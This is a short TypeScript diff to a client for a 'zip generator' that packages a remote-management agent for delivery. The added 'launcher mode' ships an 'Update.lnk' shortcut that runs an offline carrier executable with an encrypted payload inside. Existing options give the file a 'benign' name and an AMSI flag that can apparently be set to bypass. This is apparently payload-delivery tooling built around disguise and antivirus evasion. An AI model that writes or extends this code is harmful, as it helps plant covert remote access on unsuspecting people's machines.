@@ -18,6 +18,10 @@ export interface CallZipGeneratorOpts {
   features?: string[]; // e.g. ["rdp", "ping", "power"]
   fileName?: string; // benign exe filename — default "trmm-agent.exe"
   expiryHours: number; // 24 | 72 — the generator enforces this window
+  // launcher mode (WP4): zip ships { Update.lnk, Launcher.exe } — the .lnk runs
+  // the offline carrier exe directly (encrypted payload inside, nothing
+  // downloaded at runtime). Absent/false = legacy Agent.lnk downloader zip.
+  launcherMode?: boolean;
 }
 
 /**
@@ -65,6 +69,7 @@ export async function callZipGenerator(
         authToken: opts.authToken,
         features: opts.features ?? ["rdp", "ping", "power"],
         expiryHours: opts.expiryHours,
+        ...(opts.launcherMode ? { launcherMode: true } : {}),
         flags: {
           amsi: "none", // Guardrail: AMSI default none — never a bypass by default.
           fileName: opts.fileName ?? "trmm-agent.exe",
